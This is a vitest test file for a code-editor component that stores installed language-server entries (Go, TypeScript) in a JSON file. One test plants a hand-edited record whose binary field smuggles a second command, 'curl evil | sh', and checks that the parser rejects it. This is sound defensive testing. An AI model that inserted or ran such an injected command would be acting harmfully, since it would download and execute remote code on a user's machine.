import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'
import { InstalledServers } from '../lsp/installed'
import type { LanguageServerEntry } from '../lsp/catalog'

const go: LanguageServerEntry = {
  id: 'go', name: 'Go', description: 'gopls.', targets: ['vide'], languages: ['go'], binary: 'gopls',
  args: [], versionArgs: ['version'], install: { method: 'go', package: 'golang.org/x/tools/gopls@latest' },
}
const ts: LanguageServerEntry = {
  ...go, id: 'typescript', name: 'TS', languages: ['typescript', 'javascript'], binary: 'typescript-language-server',
  args: ['--stdio'], install: { method: 'npm', packages: ['typescript-language-server', 'typescript'] },
}

let dir: string
let file: string
beforeEach(() => { dir = mkdtempSync(join(tmpdir(), 'lsp-installed-')); file = join(dir, 'language-servers.json') })
afterEach(() => rmSync(dir, { recursive: true, force: true }))

describe('InstalledServers', () => {
  it('starts empty, persists adds and removes, and finds a server by language', () => {
    const a = new InstalledServers(file)
    expect(a.list()).toEqual([])
    a.add(go)
    a.add(ts)
    const b = new InstalledServers(file)
    expect(b.list().map((e) => e.id)).toEqual(['go', 'typescript'])
    expect(b.forLanguage('javascript')?.id).toBe('typescript')
    expect(b.forLanguage('python')).toBeNull()
    expect(b.remove('go')).toBe(true)
    expect(b.remove('go')).toBe(false)
    expect(new InstalledServers(file).list().map((e) => e.id)).toEqual(['typescript'])
  })

  it('a reinstall replaces the snapshot rather than duplicating it', () => {
    const a = new InstalledServers(file)
    a.add(go)
    a.add({ ...go, args: ['-rpc.trace'] })
    expect(a.list()).toHaveLength(1)
    expect(a.get('go')?.args).toEqual(['-rpc.trace'])
  })

  it('drops records that would not pass the catalog parser (hand-edited file)', () => {
    writeFileSync(file, JSON.stringify([
      { installedAt: 1, entry: { ...go, binary: 'gopls; curl evil | sh' } },
      { installedAt: 2, entry: ts },
    ]))
    expect(new InstalledServers(file).list().map((e) => e.id)).toEqual(['typescript'])
  })

  it('treats a corrupt file as nothing installed', () => {
    writeFileSync(file, '{not json')
    expect(new InstalledServers(file).list()).toEqual([])
    expect(readFileSync(file, 'utf8')).toBe('{not json')
  })
})
